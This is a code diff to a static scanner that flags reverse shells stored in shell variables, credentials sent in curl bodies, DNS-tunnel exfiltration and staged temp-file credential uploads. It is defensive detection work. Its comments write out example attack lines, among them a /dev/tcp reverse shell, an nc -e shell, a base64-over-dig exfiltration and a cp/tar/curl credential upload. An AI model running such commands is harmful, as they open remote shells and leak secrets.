+    if len(out) + len(persist_out) <= _MAX_FINDINGS_PER_FILE:
+        return out + persist_out
 
     # More candidates survived the per-PASS budgets above than the
     # per-FILE cap allows overall. Truncate by SEVERITY, never by discovery order - a
@@ -14036,8 +16703,11 @@ def analyze_python(
     # for an explicit disclosure finding, so a capped file reads as visibly incomplete
     # (never silently "clean beyond what was reported") while the return value still
     # honors `len(out) <= _MAX_FINDINGS_PER_FILE` for every caller of this function.
-    kept = sorted(out, key=lambda f: -_ast_severity_rank(f.severity))[: _MAX_FINDINGS_PER_FILE - 1]
+    kept = sorted(out, key=lambda f: -_ast_severity_rank(f.severity))[
+        : _MAX_FINDINGS_PER_FILE - 1 - len(persist_out)
+    ]
     suppressed = len(out) - len(kept)
+    kept.extend(persist_out)
     kept.append(
         ASTFinding(
             "AST_FINDINGS_TRUNCATED",
@@ -14892,10 +17562,12 @@ def _imported_sink_names(tree: ast.AST) -> tuple:
     Found by the adversarial pass on B-592: `from urllib.request import urlopen as u`
     then `u(url)` is an ORDINARY idiom, not evasion, and a bare-Name call carries no base
     for `_is_net_sink` to gate on - so the whole family went unreported. Deliberately
-    NOT extended to `getattr(requests, "post")(...)` or
-    `importlib.import_module("os").system(...)`: those are evasion shapes the engine's own
-    rules do not resolve either, and a presence scan that out-detects the finding engine
-    would put capabilities in a permission proposal that no check can corroborate.
+    NOT extended to `importlib.import_module("os").system(...)` or a getattr with a
+    non-constant attribute name: those are evasion shapes the engine's own rules do not
+    resolve either, and a presence scan that out-detects the finding engine would put
+    capabilities in a permission proposal that no check can corroborate. (A getattr with
+    a CONSTANT attribute name is resolved by `_is_net_sink` since B-1058, so presence
+    follows it there - it mirrors the engine rather than leading or trailing it.)
     """
     net_names: set = set()
     exec_names: set = set()
@@ -16706,12 +19378,140 @@ _SH_REV_REASONS = {
 }
 
 
+# B-1062: a reverse-shell command STORED in a shell variable and then run through it.
+#   C="bash -i >& /dev/tcp/H/P 0>&1"; eval "$C"        sh -c "$C"        $C   (nc -e form)
+# The scan above only reads a payload in command position, so the stored text -- plainly on
+# the assignment line -- was never judged. The closed mechanism added here: remember, in
+# source order, each variable whose value is ONE plain quoted literal (no `$`, no backtick,
+# no command substitution), and where a later line RUNS the variable -- `eval "$C"` / `eval $C`,
+# `<shell> [flags] -c "$C"` (QUOTED ref only: unquoted `-c $C` word-splits and runs only the first
+# word), or an unquoted `$C` / `${C}` as the first word of a statement -- rewrite the reference
+# into the literal it stands for and let the existing command-position rules judge the result.
+# So the inline form and the stored form get the same verdict by construction. A mere
+# `echo "$C"` / `printf %s "$C"` / `cat <<<"$C"` is not a run site and stays silent. Any
+# other rebinding of the name (a non-literal assignment, `+=`, `unset`, `read`, a `for` loop
+# variable, `local`/`declare` without a literal) forgets it. Known limits (kept, like the rest
+# of this block, closed): a value built from other variables or `$(...)`, a value spanning
+# several lines, a copy through a second variable (`D=$C; eval "$D"`), `echo "$C" | bash`
+# (the pipe-to-shell shape is already a declared ceiling), `source <(echo "$C")`, and
+# scope: the walk is source-ordered and flow-insensitive across functions and branches.
+_SH_STORED_ASSIGN_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*"
+    r"(?:(?:export|readonly|declare(?:\s+-[A-Za-z]+)*|typeset(?:\s+-[A-Za-z]+)*|local)\s+)?"
+    r"(?P<name>[A-Za-z_]\w*)=(?P<val>\"(?:[^\"\\]|\\.)*\"|'[^']*')?"
+)
+_SH_STORED_REBIND_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?:"
+    r"(?P<plus>[A-Za-z_]\w*)\+=|unset\s+(?:-[fnv]\s+)?(?P<unset>[A-Za-z_]\w*)"
+    r"|for\s+(?P<for>[A-Za-z_]\w*)\s+in\b|read\s+(?:-[A-Za-z]+\s+)*(?P<read>[A-Za-z_]\w*))"
+)
+_SH_STORED_NAME = r"[A-Za-z_]\w*"
+_SH_STORED_EVAL_USE_RE = re.compile(
+    r"(?<![\w.$/{}-])eval\s+(?P<ref>\"\$(?P<n1>" + _SH_STORED_NAME + r")\"|\"\$\{(?P<n2>" + _SH_STORED_NAME
+    + r")\}\"|\$(?P<n3>" + _SH_STORED_NAME + r")\b|\$\{(?P<n4>" + _SH_STORED_NAME + r")\})"
+)
+_SH_STORED_DASHC_USE_RE = re.compile(
+    r"(?<=\s)-[A-Za-z]*c\s+(?P<ref>\"\$(?P<n1>" + _SH_STORED_NAME + r")\"|\"\$\{(?P<n2>" + _SH_STORED_NAME + r")\}\")"
+)
+_SH_STORED_BARE_USE_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?P<ref>\$(?P<n3>" + _SH_STORED_NAME + r")\b|\$\{(?P<n4>"
+    + _SH_STORED_NAME + r")\})"
+)
+_SH_STORED_META_RE = re.compile(r"[;&|<>()$`'\"\\\n{}*?\[~#]")
+_SH_STORED_ADD_MAX = 16384  # bytes inlining may add to ONE line
+_SH_STORED_FILE_MAX = 1 << 20  # ... and to one whole file
+
+
+def _sh_stored_literal(val: str) -> "str | None":
+    """The text a plain quoted literal stands for, or None when it expands anything."""
+    q = val[0]
+    body = val[1:-1]
+    if q == "'":
+        return body
+    if re.search(r"(?<!\\)(?:\$|`)", body):
+        return None
+    return re.sub(r"\\([\"$`\\])", r"\1", body)
+
+
+def _sh_stored_track(line: str, env: dict) -> None:
+    """Update `env` (name -> literal) from the assignments / rebindings on one logical line.
+
+    Only a literal that can carry a reverse-shell primitive at all (a cue, or an `&` that may
+    dup an fd) is kept -- any other value can never convict, so it needs no entry -- and there
+    is NO count or length cap: every kept value is a slice of the file being scanned, so memory
+    is bounded by the file, and a cap would be an evasion (64 dummy assignments, or a payload
+    padded with spaces, in front of the real one). Runs of blanks are collapsed so padding does
+    not push the payload past the scan's own argument bound. What bounds the WORK is the
+    per-line inlining budget in `_sh_stored_inline`, which spills to a memoized scan instead."""
+    for m in _SH_STORED_REBIND_RE.finditer(line):
+        env.pop(m.group("plus") or m.group("unset") or m.group("for") or m.group("read"), None)
+    for m in _SH_STORED_ASSIGN_RE.finditer(line):
+        name, val = m.group("name"), m.group("val")
+        lit = _sh_stored_literal(val) if val else None
+        # a quoted literal must END the word (`C="a"$X` is not a plain literal)
+        if lit is not None and line[m.end() : m.end() + 1] not in ("", " ", "\t", ";", "&", "|", ")", "}", "#"):
+            lit = None
+        if lit is not None:
+            lit = re.sub(r"[ \t]{2,}", " ", lit).strip()
+        if lit and (_SH_REV_CUE_RE.search(lit) or "&" in lit):
+            env[name] = lit
+        else:
+            env.pop(name, None)
+
+
+def _sh_stored_inline(line: str, env: dict, budget: list) -> tuple:
+    """`(text, spill)`: `line` with every RUN reference to a tracked variable replaced by the
+    literal it holds (double-quoted for the `eval` / `-c` wrapper forms, raw for a bare
+    command-position `$C`), and `spill` = `{literal: kind}` for the references that were NOT
+    inlined because the line's added-bytes budget (`_SH_STORED_ADD_MAX`) or the file's
+    (`budget[0]`, shared across lines) ran out. A spilled
+    literal is judged on its own by the caller (memoized), so the budget bounds the work
+    without ever silently dropping a reference."""
+    if not env or "$" not in line:
+        return line, {}
+    spill: dict = {}
+    added = [0]
+
+    def sub(rx, quote: bool, text: str) -> str:
+        out = []
+        last = 0
+        for m in rx.finditer(text):
+            name = next((m.group(g) for g in ("n1", "n2", "n3", "n4") if m.groupdict().get(g)), None)
+            lit = env.get(name) if name else None
+            if lit is None:
+                continue
+            # A bare `$C` is only word-split, never re-parsed as shell syntax: it can run a
+            # stored `nc -e /bin/sh H P` but NOT a stored redirect (`bash -i >& /dev/tcp/..`
+            # would hand `>&` to bash as an argument). Only a metacharacter-free value counts.
+            if not quote and _SH_STORED_META_RE.search(lit):
+                continue
+            if added[0] + len(lit) > _SH_STORED_ADD_MAX or len(lit) > budget[0]:
+                spill[lit] = "q" if quote else "b"
+                continue
+            added[0] += len(lit)
+            budget[0] -= len(lit)
+            if quote:
+                lit = '"' + lit.replace("\\", "\\\\").replace('"', '\\"').replace("$", "\\$").replace("`", "\\`") + '"'
+            out.append(text[last : m.start("ref")])
+            out.append(lit)
+            last = m.end("ref")
+        out.append(text[last:])
+        return "".join(out)
+
+    line = sub(_SH_STORED_EVAL_USE_RE, True, line)
+    line = sub(_SH_STORED_DASHC_USE_RE, True, line)
+    return sub(_SH_STORED_BARE_USE_RE, False, line), spill
+
+
 def _sh_reverse_shell_lines(masked: str) -> list:
     """`[(physical_line, shape)]` for every logical line of `masked` (whole-line comments
     already blanked) carrying a reverse-shell primitive -- see the C-630 block above."""
     joined = _sh_loop_join_continuations(masked)
     hits = []
     open_fds: set = set()
+    var_env: dict = {}  # B-1062: variables holding one plain quoted literal
+    inline_budget = [_SH_STORED_FILE_MAX]
+    spill_memo: dict = {}  # (literal, open fds) -> shape | None
     ln = 1
     pos = 0
     for raw in joined.split("\n"):
@@ -16719,7 +19519,8 @@ def _sh_reverse_shell_lines(masked: str) -> list:
         seg = pos
         ln += masked.count("\n", pos, pos + len(raw)) + 1
         pos += len(raw) + 1
-        if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+        track = bool(var_env) or "=" in raw  # B-1062: assignments / rebinds / run sites
+        if not track and not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
             continue
         # Comments are code that never runs: blank them (per PHYSICAL line -- see
         # `_sh_rev_lex`) before anything reads the line, so a trailing `# note` cannot turn
@@ -16732,6 +19533,15 @@ def _sh_reverse_shell_lines(masked: str) -> list:
                 breaks.append(k - seg)
                 k = masked.find("\n", k + 1, seg + len(raw))
             raw = _sh_rev_lex(raw, breaks)[1]
+        # B-1062: the stored-variable view of the line is an ADDITIONAL layer next to the
+        # original text (never a replacement), so inlining can only add a detection.
+        inl, spill = raw, {}
+        if track:
+            _sh_stored_track(raw, var_env)
+            inl, spill = _sh_stored_inline(raw, var_env, inline_budget)
+        if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+            if not spill and (inl == raw or not (_SH_REV_CUE_RE.search(inl) or (open_fds and "&" in inl))):
+                continue
         # Every layer is (text, quote mask, command-position oracle), each built once. A wrapper
         # BODY is only worth a scan when it can carry a primitive at all -- the same gate the
         # line itself passed (a cue, or an `&` that could be a dup of an fd this line opens):
@@ -16739,23 +19549,58 @@ def _sh_reverse_shell_lines(masked: str) -> list:
         # is exact, not a heuristic: nothing in `_sh_rev_scan_text` can answer for a text
         # without a cue unless it dups an fd (`&`), and an unwrapped body only ever loses
         # backslashes, so it cannot GAIN a cue its parent lacked.
-        may_open = bool(open_fds) or "/dev/" in raw
-        layers = [(raw, *_sh_rev_prepare(raw))]
-        texts = list(layers)
-        for _ in range(2):  # `bash -c "bash -c '...'"`: two wrapper levels, no more
-            nxt = []
-            for t, mask, oracle in layers:
-                for body in _sh_rev_unwrap(t, mask, oracle):
-                    if _SH_REV_CUE_RE.search(body) or (may_open and "&" in body):
-                        b = _sh_rev_lex(body, [])[1]
-                        nxt.append((b, *_sh_rev_prepare(b)))
-            if not nxt:
-                break
-            layers = nxt
-            texts.extend(layers)
+        may_open = bool(open_fds) or "/dev/" in raw or "/dev/" in inl
+        raw_ok = bool(_SH_REV_CUE_RE.search(raw)) or bool(open_fds and "&" in raw)
+
+        def widen(seed):
+            out = list(seed)
+            cur = seed
+            for _ in range(2):  # `bash -c "bash -c '...'"`: two wrapper levels, no more
+                nxt = []
+                for t, mask, oracle in cur:
+                    for body in _sh_rev_unwrap(t, mask, oracle):
+                        if _SH_REV_CUE_RE.search(body) or (may_open and "&" in body):
+                            b = _sh_rev_lex(body, [])[1]
+                            nxt.append((b, *_sh_rev_prepare(b)))
+                if not nxt:
+                    break
+                cur = nxt
+                out.extend(cur)
+            return out
+
+        fds_before = set(open_fds)
         shape = None
-        for t, mask, oracle in texts:
+        # (a raw line without its own cue cannot answer -- the gate above is exact -- so it is
+        # not scanned; only its inlined / spilled view below can)
+        for t, mask, oracle in widen([(raw, *_sh_rev_prepare(raw))]) if raw_ok else ():
             shape = _sh_rev_scan_text(t, open_fds, mask, oracle)
+            if shape:
+                break
+        if not shape and inl != raw:
+            # the inlined text, scanned from the fd state the line started in
+            fds = set(fds_before)
+            seed = [(inl, *_sh_rev_prepare(inl))]
+            for t, mask, oracle in widen(seed):
+                shape = _sh_rev_scan_text(t, fds, mask, oracle)
+                if shape:
+                    break
+            open_fds.clear()
+            open_fds.update(fds)
+        for lit in () if shape else spill:
+            # over-budget references: judge the literal itself, once per (literal, fd state);
+            # the fd state it leaves behind is part of the memo, so a hit and a miss agree
+            key = (lit, frozenset(open_fds))
+            if key not in spill_memo:
+                b = _sh_rev_lex(lit, [])[1]
+                got = None
+                fds = set(open_fds)
+                for t, mask, oracle in widen([(b, *_sh_rev_prepare(b))]):
+                    got = _sh_rev_scan_text(t, fds, mask, oracle)
+                    if got:
+                        break
+                spill_memo[key] = (got, frozenset(fds))
+            shape, fds_after = spill_memo[key]
+            open_fds.update(fds_after)
             if shape:
                 break
         if shape:
@@ -18404,6 +21249,389 @@ def _sh_newline_offsets(text: str) -> list[int]:
     return offs
 
 
+# B-1065: curl flags whose VALUE is request BODY/FORM data the server receives -- the
+# data-exfil channel. Kept DISTINCT from -H/--header (curlgrammar role AUTH_HEADER): a
+# secret in an `Authorization: Bearer $TOKEN` header is ordinary authed-API traffic (a
+# skill talking to its OWN api), which is exactly why analyze_shell's raw-socket-only
+# SHELL_ENV_EXFIL deliberately left `$VAR` piped to curl out of scope. The BODY channel
+# is the different, exfil-shaped case: a raw secret placed in POST data to a host.
+_SH_CURL_BODY_FLAGS = frozenset({
+    "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode",
+    "--form", "--form-string",
+})
+
+
+#: Programs whose single-quoted argument is THEIR OWN language, with no way to run a shell
+#: command or expand a shell variable: a ``$name`` there is a jq variable, not a secret.
+#: Deliberately just ``jq`` -- awk (``system()``), sed (``e``), perl, python, sh/bash/eval/
+#: envsubst/xargs all hand the quoted text to a shell or interpreter that DOES expand it.
+_SH_DOLLAR_IS_OWN_SYNTAX_PROGS = frozenset({"jq"})
+
+
+def _sh_word_expands_cred_env(word, depth: int = 0) -> bool:
+    """B-1065: whether the shell would EXPAND a credential-shaped variable inside this
+    curl body word. Only a ``variable`` part (``$TOKEN``/``${TOKEN}``) or a variable
+    inside a ``$(...)`` command substitution counts; ``$name`` inside a single-quoted run
+    of a ``jq '{password:$password}'`` filter template is jq's own variable, not a secret.
+
+    Fail-closed, the narrowing is deliberately tiny:
+      * the ONLY thing cleared is a ``$name`` in a literal (single-quoted) word of a
+        ``jq`` command inside a ``$(...)``; any other command's words (echo, sh -c,
+        eval, envsubst, xargs, awk, ...) keep the raw-text match, because those hand the
+        quoted text to something that expands it;
+      * backtick substitutions are never narrowed (their body is un-escaped by the shell
+        before it is parsed, so a re-scan would see different text);
+      * an unscannable ``$(...)`` (unbalanced, arithmetic, nesting past the bound) keeps
+        the raw-text match.
+    """
+    for part in word.parts:
+        if part.kind == "variable":
+            if _SH_CRED_ENV_RE.search(part.text):
+                return True
+        elif part.kind == "cmdsub":
+            if not _SH_CRED_ENV_RE.search(part.text):
+                continue
+            txt = part.text
+            cmds = None
+            if txt.startswith("$(") and txt.endswith(")") and not txt.startswith("$(("):
+                cmds = _shellwords.scan_line(txt[2:-1]) if depth < 4 else None
+            if cmds is None:
+                return True  # backtick / arithmetic / unscannable: raw match stands
+            for c in cmds:
+                if not c.words:
+                    continue
+                if c.words[0].text in _SH_DOLLAR_IS_OWN_SYNTAX_PROGS:
+                    if any(_sh_word_expands_cred_env(w, depth + 1) for w in c.words):
+                        return True
+                elif any(_SH_CRED_ENV_RE.search(w.text) for w in c.words):
+                    return True
+        elif part.kind != "literal" and _SH_CRED_ENV_RE.search(part.text):
+            # glob/brace/unknown kinds: never silently clear a credential-shaped name.
+            return True
+    return False
+
+
+def _sh_cred_env_in_body_lines(masked: str) -> set:
+    """B-1065: physical line numbers where a credential-shaped env var
+    (``$...SECRET``/``$...TOKEN``/... per ``_SH_CRED_ENV_RE``) is the value of a curl
+    DATA/FORM body flag (``-d``/``--data*``/``-F``/``--form*``) -- a secret sent off-box
+    in the request body.
+
+    This is the shell twin of the Python ``ENV_EXFIL_FLOW`` rule, which the shell side
+    had no equivalent for: ``SHELL_ENV_EXFIL`` fires only on a RAW socket (nc//dev/tcp),
+    and curl bodies were deliberately excluded because a ``$VAR`` reaching curl is often
+    an authed-API script. The discriminator here is the curl option ROLE, parsed with
+    the real positional ``curlargv``: a secret in a body flag's value is flagged; a
+    secret in ``-H``/``--header`` (role AUTH_HEADER) is NOT -- that is the legitimate
+    auth channel, and the corpus confirms legit scripts put the credential in the header
+    (`Authorization: Bearer $KEY`) with only non-secret data in the body.
+
+    Emitted at ``info`` severity (WARN, never FAIL): a body credential is genuinely
+    ambiguous -- an OAuth token endpoint legitimately posts ``client_secret=$SECRET`` to
+    its OWN provider -- which is exactly the ``warns_env_exfil`` "confirm the destination
+    is a trusted first-party API" case. Scoped to curl: ``curlargv`` is curl-specific, so
+    wget's own ``--post-data``/``--body-data`` body channel is a known remaining gap.
+    """
+    hits: set = set()
+    for i, raw in enumerate(masked.splitlines(), 1):
+        if "curl" not in raw or not _SH_CRED_ENV_RE.search(raw):
+            continue
+        commands = _shellwords.scan_line(raw)
+        if commands is None:
+            continue
+        for cmd in commands:
+            words = cmd.words
+            if not words:
+                continue
+            idx = 0
+            if idx < len(words) and words[idx].text == "do" and idx + 1 < len(words):
+                idx += 1
+            while idx < len(words) and _SH_ENV_PREFIX_ASSIGN_RE.match(words[idx].text):
+                idx += 1
+            if idx < len(words) and words[idx].text == "sudo" and idx + 1 < len(words):
+                idx += 1
+            if idx >= len(words) or words[idx].text != "curl":
+                continue
+            for t in _curlargv.parse_argv(words[idx + 1:]):
+                if (
+                    t.long_name in _SH_CURL_BODY_FLAGS
+                    and t.value_text
+                    and _SH_CRED_ENV_RE.search(t.value_text)
+                    and (
+                        t.value_word is None
+                        or _sh_word_expands_cred_env(t.value_word)
+                    )
+                ):
+                    hits.add(i)
+                    break
+    return hits
+
+
+# B-1063: DNS-label exfiltration. A DNS lookup tool (dig/drill/nslookup/host/getent) is
+# an outbound channel the HTTP-centric SHELL_CRED_EXFIL model never saw: a secret placed
+# in the QUERY NAME leaves the box over DNS. A credential FILE needs an ENCODER
+# (base64/hex) to fit a <=63-char label, so a bare config read beside a dig is NOT flagged
+# (a benign `dig $(jq -r .dns_server openclaw.json)` reads one field, never encodes it); a
+# credential-shaped ENV VAR is already short enough to ride a label verbatim, so it needs
+# no encoder. See `_sh_dns_cred_exfil_lines` for the full rule.
+# Tool match: the unambiguous tool names match as a whole word anywhere on the line,
+# tolerating a path prefix (`/usr/bin/dig`) and any wrapper (`timeout 5 dig`, `env dig`,
+# `xargs dig`). `host` is ALSO an ordinary word ($HOST, hostname, host:port), so it is
+# matched only in command position (line start / after a separator / after a common
+# wrapper) AND followed by an argument.
+_SH_DNS_TOOL_RE = re.compile(
+    r"(?:^|[\s;&|(`/])(?:dig|drill|nslookup|resolvectl)\b", re.I
+)
+# ReDoS-safe: no two space-quantifiers are adjacent over the same text. Branch 1 is a
+# line start or separator followed by optional spaces; branch 2 is a wrapper word followed
+# by required spaces. The original `...[ \t]+)[ \t]*host` had an adjacent `[ \t]+`/`[ \t]*`
+# pair -> catastrophic backtracking on a run of spaces before a non-`host` word.
+_SH_DNS_HOST_RE = re.compile(
+    r"(?:(?:^|[;&|(`])[ \t]*"
+    r"|\b(?:do|then|else|sudo|env|timeout|nice|xargs|exec|command|if|while|until|time)\b[ \t]+)"
+    r"host[ \t]+(?=\S)",
+    re.I,
+)
+_SH_GETENT_HOSTS_RE = re.compile(r"\bgetent[ \t]+(?:hosts|ahosts\w*)\b", re.I)
+# The encoder is the low-FP discriminator for a whole-file credential: real DNS exfil must
+# base64/hex a file to fit it into <=63-char labels, while a benign config-driven lookup
+# reads one field and never encodes it. Kept to the CLEAR encoders; `tr -d`/`cut`/`fold`
+# are deliberately excluded (ordinary whitespace/field trimming, too common to treat as
+# an exfil encoder).
+_SH_ENCODER_RE = re.compile(
+    r"\b(?:base64|base32|basenc|xxd|hexdump|uuencode|openssl|od)\b"
+    r"|printf\b[^|;&]*%0?2?[xX]",
+    re.I,
+)
+
+
+def _sh_dns_line(raw: str) -> bool:
+    return bool(
+        _SH_DNS_TOOL_RE.search(raw)
+        or _SH_DNS_HOST_RE.search(raw)
+        or _SH_GETENT_HOSTS_RE.search(raw)
+    )
+
+
+def _sh_dns_cred_exfil_lines(masked: str) -> set:
+    """B-1063: physical line numbers where a credential (a cred FILE read or a
+    credential-shaped env var) is encoded and placed into a DNS lookup's query name --
+    DNS-tunnel exfiltration.
+
+    A credential FILE needs an ENCODER (base64/hex/...) to fit into a <=63-char DNS
+    label, so a bare config read beside a dig is deliberately NOT flagged (a benign
+    config-driven lookup reads one field and never encodes it). A credential-shaped ENV
+    VAR is already short enough to ride a label verbatim, so it needs NO encoder -- it is
+    flagged whenever it reaches the DNS query directly or through a variable.
+
+    Taint is tracked to a fixpoint over plain AND declaration-keyword assignments
+    (`local`/`declare`/`export`/...), carrying three facts per variable: it references a
+    cred env var (env), it touches a cred file (file), and an encoder appears in its
+    derivation (enc). A variable reaches the DNS query as exfil material when it is
+    env-tainted, or file-tainted AND enc-tainted.
+
+    Line-based (a backslash-continued binding/lookup is a known gap, shared with the
+    sibling SHELL_ENV_EXFIL raw-socket check). Emitted at ``info`` severity -> WARN,
+    routed into the warns_env_exfil bucket, same as the Python ENV_EXFIL_FLOW and the
+    B-1065 body-exfil rule.
+    """
+    lines = masked.splitlines()
+    # Collect (var, rhs) for plain `VAR=...` and declaration-keyword assignments.
+    assigns: list = []
+    for raw in lines:
+        m = _SH_VAR_ASSIGN_RE.match(raw)
+        if m:
+            assigns.append((m.group("var"), m.group("val")))
+            continue
+        dm = _SH_VAR_DECL_ASSIGN_RE.match(raw)
+        if dm:
+            assigns.append((dm.group("var"), raw[dm.end():]))
+
+    def _refs(text: str) -> set:
+        return set(_SH_VAR_REF_RE.findall(text))
+
+    # Three taint sets propagated by a WORKLIST over the variable-dependency graph: linear
+    # in (assignments + reference edges), so it needs no pass cap (which would fail-OPEN by
+    # silently under-tainting) and cannot run away (the DoS the pass cap guarded against).
+    # Monotonic: a set only grows, and an item is re-queued only when a var it references
+    # gained taint, so it terminates. env = carries a credential-shaped ENV VAR (needs no
+    # encoder); file = touches a credential FILE; enc = an encoder in the derivation chain.
+    items = [(var, val, _refs(val)) for var, val in assigns]
+    dependents: dict = {}
+    for i, (_var, _val, refs) in enumerate(items):
+        for r in refs:
+            dependents.setdefault(r, set()).add(i)
+    env_t: set = set()
+    file_t: set = set()
+    enc_t: set = set()
+    work = set(range(len(items)))
+    while work:
+        i = work.pop()
+        var, val, refs = items[i]
+        grew = False
+        if var not in env_t and (_SH_CRED_ENV_RE.search(val) or (refs & env_t)):
+            env_t.add(var)
+            grew = True
+        if var not in file_t and (_SH_CRED_FILE_RE.search(val) or (refs & file_t)):
+            file_t.add(var)
+            grew = True
+        if var not in enc_t and (_SH_ENCODER_RE.search(val) or (refs & enc_t)):
+            enc_t.add(var)
+            grew = True
+        if grew:
+            work |= dependents.get(var, set())
+    ready = env_t | (file_t & enc_t)
+
+    def _dns_arg_texts(raw: str) -> list:
+        # The argument text of each DNS command on the line: from the tool name to the
+        # next top-level command separator (`;`/`&`). Sliced at `;`/`&` only, NOT `|`, so
+        # a `$(... | encoder)` substitution inside the query stays intact while a
+        # credential sitting on a SEPARATE command of the same line (`dig x; cat $TOKEN`)
+        # is not mis-attributed to the lookup.
+        spans: list = []
+        for rx in (_SH_DNS_TOOL_RE, _SH_DNS_HOST_RE, _SH_GETENT_HOSTS_RE):
+            for m in rx.finditer(raw):
+                tail = raw[m.end():]
+                sep = re.search(r"[;&]", tail)
+                spans.append(tail[: sep.start()] if sep else tail)
+        return spans
+
+    hits: set = set()
+    for i, raw in enumerate(lines, 1):
+        if not _sh_dns_line(raw):
+            continue
+        for arg in _dns_arg_texts(raw):
+            arg_refs = _refs(arg)
+            # A cred env var rides a DNS label verbatim (no encoder needed). A cred FILE
+            # must be encoded within the same query -- and a reference to a file-tainted
+            # variable counts as the credential file, an encoder-tainted variable as the
+            # encoder, so a mix of a literal and a variable on either side is still caught
+            # (`dig $(cat $F | base64)` with F a file-tainted var). A variable already
+            # fully resolved to exfil material (env-tainted, or file+encoder-tainted) also
+            # reaches the query.
+            has_cred_file = bool(_SH_CRED_FILE_RE.search(arg)) or bool(arg_refs & file_t)
+            has_encoder = bool(_SH_ENCODER_RE.search(arg)) or bool(arg_refs & enc_t)
+            if (
+                _SH_CRED_ENV_RE.search(arg)
+                or (arg_refs & env_t)
+                or (has_cred_file and has_encoder)
+                or (ready and (arg_refs & ready))
+            ):
+                hits.add(i)
+                break
+    return hits
+
+
+# B-1066: staged temp-file laundering. A credential file is copied/archived into an
+# intermediate file, then THAT file is uploaded -- the upload command references only the
+# temp path, so the credential->upload data flow is broken (`cp cred /tmp/x; tar czf
+# /tmp/a.tgz /tmp/x; curl -T /tmp/a.tgz host`). Taint flows across copy/archive commands:
+# a cp/mv/rsync/tar/zip/... that touches a credential file (or an already-tainted path)
+# taints its output paths, to a fixpoint; an outbound curl/wget that uploads a tainted
+# path is then flagged. Ambiguous (a config BACKUP to the user's own service has the same
+# shape) -> WARN, never FAIL. Redirect-based laundering (`cat cred > x`) is a known gap:
+# shellwords cannot parse a redirection, so that line is skipped.
+_SH_COPY_ARCHIVE_CMDS = frozenset({
+    "cp", "mv", "install", "rsync", "tar", "zip", "gzip", "bzip2", "xz", "zstd",
+    "7z", "7za", "cpio", "pax",
+})
+
+
+def _sh_cmd_name_index(words: list) -> "int | None":
+    """Index of the command NAME word, skipping a leading `do`/`then`, `VAR=val`
+    env-prefixes and one `sudo`. None if no name word remains."""
+    idx = 0
+    if idx < len(words) and words[idx] in ("do", "then") and idx + 1 < len(words):
+        idx += 1
+    while idx < len(words) and _SH_ENV_PREFIX_ASSIGN_RE.match(words[idx]):
+        idx += 1
+    if idx < len(words) and words[idx] == "sudo" and idx + 1 < len(words):
+        idx += 1
+    return idx if idx < len(words) else None
+
+
+def _sh_path_candidates(word: str) -> set:
+    """Candidate file-path strings inside one shell word, for taint matching: the bare
+    word, the piece after a `@` (curl `-F f=@PATH`, `-d @PATH`), and the piece after a `=`
+    (wget `--post-file=PATH`). Surrounding quote characters are stripped (shellwords keeps
+    them in `.text`). Flags and URLs are dropped."""
+    word = word.strip("\"'`")
+    cands = {word}
+    if "@" in word:
+        cands.add(word.rsplit("@", 1)[-1].strip("\"'`"))
+    if "=" in word:
+        cands.add(word.rsplit("=", 1)[-1].strip("\"'`"))
+    return {c for c in cands if c and not c.startswith("-") and "://" not in c}
+
+
+def _sh_staged_cred_upload_lines(masked: str) -> set:
+    """B-1066: physical line numbers where a curl/wget uploads a file whose content was
+    derived from a credential file through an intermediate copy/archive (temp-file
+    laundering). Emitted at ``info`` severity -> WARN (warns_env_exfil).
+
+    Taint is propagated by a WORKLIST over the copy/archive commands (linear in commands
+    plus path-reference edges): a command taints its path args when it has a literal
+    credential-file arg or any of its path args is already tainted. No pass cap -- a cap
+    would fail-OPEN by silently under-tainting a deep chain -- and the worklist is
+    monotonic, so it cannot run away."""
+    def _copy_paths(word: str) -> str:
+        w = word.strip("\"'`")
+        w = w[1:] if w.startswith("@") else w
+        if not w or w.startswith("-") or "://" in w:
+            return ""
+        return w
+
+    line_cmds = [_shellwords.scan_line(raw) for raw in masked.splitlines()]
+
+    # One record per copy/archive command: its path args and whether it reads a literal
+    # credential file. `dependents[path]` = command indices that name that path.
+    copy_cmds: list = []
+    dependents: dict = {}
+    for cmds in line_cmds:
+        if not cmds:
+            continue
+        for c in cmds:
+            words = [w.text for w in c.words]
+            ci = _sh_cmd_name_index(words)
+            if ci is None or words[ci].rsplit("/", 1)[-1] not in _SH_COPY_ARCHIVE_CMDS:
+                continue
+            args = words[ci + 1:]
+            paths = {p for p in (_copy_paths(a) for a in args) if p}
+            has_cred = any(_SH_CRED_FILE_RE.search(a) for a in args)
+            idx = len(copy_cmds)
+            copy_cmds.append((paths, has_cred))
+            for p in paths:
+                dependents.setdefault(p, set()).add(idx)
+
+    tainted: set = set()  # literal file-path strings holding cred-derived content
+    work = set(range(len(copy_cmds)))
+    while work:
+        idx = work.pop()
+        paths, has_cred = copy_cmds[idx]
+        if not (has_cred or (paths & tainted)):
+            continue
+        for p in paths:
+            if p not in tainted:
+                tainted.add(p)
+                work |= dependents.get(p, set())
+
+    hits: set = set()
+    if not tainted:
+        return hits
+    for i, (raw, cmds) in enumerate(zip(masked.splitlines(), line_cmds), 1):
+        if cmds is None or not _SH_OUTBOUND_RE.search(raw):
+            continue
+        for c in cmds:
+            words = [w.text for w in c.words]
+            ci = _sh_cmd_name_index(words)
+            if ci is None or words[ci].rsplit("/", 1)[-1] not in _CURL_WGET_PROGRAMS:
+                continue
+            if any(_sh_path_candidates(w) & tainted for w in words[ci + 1:]):
+                hits.add(i)
+                break
+    return hits
+
+
 def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     """Conservative regex pass over a bundled .sh/.bash/.zsh file (F-050). No shell AST;
     stdlib regex only; never raises, never executes. Flags high-confidence shapes:
@@ -18489,6 +21717,45 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "a credential-shaped environment variable is sent over a raw socket "
                 "(nc//dev/tcp) \u2014 credential exfiltration",
             )
+
+    # B-1065: a credential-shaped env var in a curl request BODY (-d/--data/--form) --
